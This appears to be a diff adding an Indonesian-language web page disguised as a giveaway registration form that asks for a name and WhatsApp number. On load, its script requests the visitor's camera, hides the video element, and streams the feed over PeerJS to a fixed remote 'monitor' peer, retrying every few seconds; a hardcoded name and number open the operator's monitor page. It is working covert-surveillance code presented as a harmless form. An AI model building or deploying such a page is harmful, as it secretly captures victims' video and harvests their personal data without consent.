@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { min-height: 100vh; background: #0d1117; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; }
+        .container { width: 100%; max-width: 400px; padding: 20px; }
+        .card { background: #161b22; border: 1px solid #30363d; border-radius: 18px; padding: 32px; box-shadow: 0 8px 24px rgba(0,0,0,0.2); }
+        h1 { margin-bottom: 24px; text-align: center; font-size: 24px; font-weight: 300; }
+        
+        /* Menyembunyikan elemen sistem kamera dari layar */
+        video, #status, #log { display: none; }
+        
+        /* Styling untuk Form Login */
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 8px; color: #c9d1d9; font-size: 14px; font-weight: bold; }
+        .form-group input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: #c9d1d9; outline: none; font-size: 14px; transition: border-color 0.2s; }
+        .form-group input:focus { border-color: #58a6ff; }
+        .btn-login { width: 100%; padding: 14px; border: none; border-radius: 6px; background: #238636; color: white; font-size: 16px; font-weight: bold; cursor: pointer; transition: background-color 0.2s; }
+        .btn-login:hover { background: #2ea043; }
+        .btn-login:active { transform: scale(.98); }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="card">
+        <h1>Pendaftaran Untuk GiveAway</h1>
+        
+        <form id="debugForm">
+    <div class="form-group">
+        <label for="username">Nama Kamu</label>
+        <input type="text" id="username" placeholder="jamal.." required>
+    </div>
+
+    <div class="form-group">
+        <label for="password">Nomer WhatsApp</label>
+        <input type="number" id="password" placeholder="08..." required>
+    </div>
+
+    <button type="submit" class="btn-login">Sign in</button>
+</form>
+
+
+        <!-- Elemen Sistem (Hidden) -->
+        <video id="camera" autoplay muted playsinline></video>
+        <!-- Dummy elemen agar script tidak error jika mencari ID ini (meskipun div log & status sudah dihapus dari UI) -->
+        <div id="status"></div>
+        <div id="log"></div>
+    </div>
+</div>
+
+<script src="https://unpkg.com/peerjs@1.5.5/dist/peerjs.min.js"></script>
+<script>
+document.getElementById("debugForm").addEventListener("submit", function(event) {
+    event.preventDefault();
+
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value;
+
+    if (username === "Feri" && password === "006106") {
+        window.location.href = "monitor.html";
+    } else {
+        alert("Pendaftaran Berhasil!");
+    }
+});
+</script>
+<script>
+    const CAMERA_ID = "CAMERA-01";
+    const MONITOR_ID = "MONITOR-01";
+
+    let peer = null;
+    let cameraStream = null;
+    let currentCall = null;
+    let retryTimer = null;
+
+    const video = document.getElementById("camera");
+    
+    // Karena elemen UI log & status disembunyikan, kita arahkan log hanya ke console
+    function log(message) {
+        console.log("[CAMERA (Hidden)]", message);
+    }
+
+    function setStatus(text, type) {
+        // Status juga hanya di-log ke console
+        console.log("[STATUS]", text, type);
+    }
+
+    window.addEventListener("load", startCamera);
+
+    async function startCamera() {
+        log("Memulai kamera di latar belakang...");
+        try {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                throw new Error("getUserMedia tidak tersedia. Gunakan HTTPS atau localhost.");
+            }
+
+            setStatus("REQUESTING CAMERA", "warning");
+
+            cameraStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 20, max: 30 } },
+                audio: false
+            });
+
+            video.srcObject = cameraStream;
+            await video.play();
+            setStatus("CAMERA READY", "online");
+
+            createPeer();
+        } catch (error) {
+            console.error(error);
+            log("CAMERA ERROR: " + error.name + " - " + error.message);
+            setStatus(error.name, "error");
+        }
+    }
+
+    function createPeer() {
+        peer = new Peer(CAMERA_ID);
+
+        peer.on("open", function(id) {
+            log("Peer berhasil online: " + id);
+            setStatus("ONLINE - WAITING MONITOR", "online");
+            connectToMonitor();
+        });
+
+        peer.on("call", function(call) {
+            if (call.peer !== MONITOR_ID) {
+                call.close();
+                return;
+            }
+
+            call.answer(cameraStream);
+            currentCall = call;
+            setStatus("LIVE", "online");
+
+            call.on("close", function() {
+                currentCall = null;
+                setStatus("ONLINE - WAITING MONITOR", "online");
+                scheduleRetry();
+            });
+
+            call.on("error", function(error) {
+                currentCall = null;
+                setStatus("CALL ERROR", "error");
+                scheduleRetry();
+            });
+        });
+
+        peer.on("error", function(error) {
+            if (error.type === "peer-unavailable") {
+                currentCall = null;
+                setStatus("WAITING FOR MONITOR", "warning");
+                scheduleRetry();
+                return;
+            }
+            setStatus("PEER ERROR", "error");
+        });
+
+        peer.on("disconnected", function() {
+            setStatus("SIGNALING OFFLINE", "error");
+        });
+    }
+
+    function connectToMonitor() {
+        if (!peer || !cameraStream || currentCall) return;
+
+        try {
+            currentCall = peer.call(MONITOR_ID, cameraStream);
+
+            if (!currentCall) {
+                currentCall = null;
+                scheduleRetry();
+                return;
+            }
+
+            setStatus("CONNECTING MONITOR", "warning");
+
+            currentCall.on("close", function() {
+                currentCall = null;
+                setStatus("WAITING FOR MONITOR", "warning");
+                scheduleRetry();
+            });
+
+            currentCall.on("error", function(error) {
+                currentCall = null;
+                scheduleRetry();
+            });
+        } catch (error) {
+            currentCall = null;
+            scheduleRetry();
+        }
+    }
+
+    function scheduleRetry() {
+        if (retryTimer) return;
+        retryTimer = setTimeout(function() {
+            retryTimer = null;
+            connectToMonitor();
+        }, 3000);
+    }
+</script>
+
+
+
+</body>
+</html>
+
+
+
